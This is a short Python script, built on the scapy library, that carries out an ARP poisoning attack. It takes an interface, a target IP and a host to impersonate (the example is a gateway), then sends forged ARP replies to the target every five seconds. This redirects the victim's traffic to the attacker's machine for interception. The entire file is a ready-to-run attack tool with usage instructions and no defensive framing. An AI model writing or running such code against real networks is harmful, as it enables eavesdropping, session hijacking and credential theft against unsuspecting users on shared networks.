#!/usr/bin/env python
# ARP poisoning attack using scapy
# Usage: arp-poisoning.py <IFACE> <TARGET> <HOST TO IMPERSONATE>
# Example: arp-poisoning.py wlan0 192.168.1.108 192.168.1.1

from scapy.all import *
import sys
import time

iface = sys.argv[1]
target_host = sys.argv[2]
impersonate_host = sys.argv[3]

local_mac = get_if_hwaddr(iface)

pkt = Ether()/ARP(op=2, hwdst =local_mac, psrc=impersonate_host, pdst=target_host)

while True:
	sendp(pkt)
	time.sleep(5)
